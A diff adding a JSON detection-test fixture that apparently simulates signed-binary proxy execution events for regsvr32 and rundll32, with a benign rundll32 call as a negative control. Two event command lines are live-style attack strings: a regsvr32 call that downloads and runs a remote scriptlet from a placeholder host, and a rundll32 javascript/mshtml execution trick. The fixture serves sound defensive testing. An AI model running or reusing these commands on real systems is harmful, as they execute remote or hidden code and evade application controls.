@@ -1,0 +1,40 @@
+{
+  "id": "signed-binary-proxy",
+  "name": "Signed binary proxy execution",
+  "description": "regsvr32 and rundll32 forms; the last event is a plain rundll32 call that should stay quiet.",
+  "events": [
+    {
+      "offset_ms": 0,
+      "category": "process_creation",
+      "technique": "T1218.010",
+      "fields": {
+        "Image": "C:\\Windows\\System32\\regsvr32.exe",
+        "CommandLine": "regsvr32 /s /n /u /i:http://lab.invalid/x.sct scrobj.dll",
+        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+        "User": "LAB\\analyst"
+      }
+    },
+    {
+      "offset_ms": 900,
+      "category": "process_creation",
+      "technique": "T1218.011",
+      "fields": {
+        "Image": "C:\\Windows\\System32\\rundll32.exe",
+        "CommandLine": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";alert(1)",
+        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+        "User": "LAB\\analyst"
+      }
+    },
+    {
+      "offset_ms": 1800,
+      "category": "process_creation",
+      "technique": "T1218.011",
+      "fields": {
+        "Image": "C:\\Windows\\System32\\rundll32.exe",
+        "CommandLine": "rundll32.exe shell32.dll,Control_RunDLL",
+        "ParentImage": "C:\\Windows\\explorer.exe",
+        "User": "LAB\\analyst"
+      }
+    }
+  ]
+}
